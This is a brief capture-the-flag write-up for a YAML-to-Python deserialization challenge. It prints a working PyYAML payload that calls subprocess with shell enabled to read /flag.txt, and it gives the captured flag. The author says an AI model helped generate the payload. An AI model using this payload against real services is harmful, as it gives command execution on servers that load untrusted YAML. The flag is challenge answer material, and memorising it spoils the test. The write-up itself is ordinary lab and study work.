Solution:

1. Start out by launching the challenge URL to find that this is a deseralization challenge. In this case, we're
   deserializing YAML to Python.

   	a. https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization

2. Using our trust AI companion we can feed HackTricks in and generate a neat-o burrito payload without feeling
   an ounce of shame or guilt. 

   	a. Note: It took a few tries but eventually we got a working payload

   	!!python/object/apply:subprocess.check_output
	args:
	  - ["cat /flag.txt"]
	kwds:
	  shell: true
	  text: true

  "flag{b20870a1955ac22377045e3b2dcb832a}\n"

3. Flag: flag{b20870a1955ac22377045e3b2dcb832a}
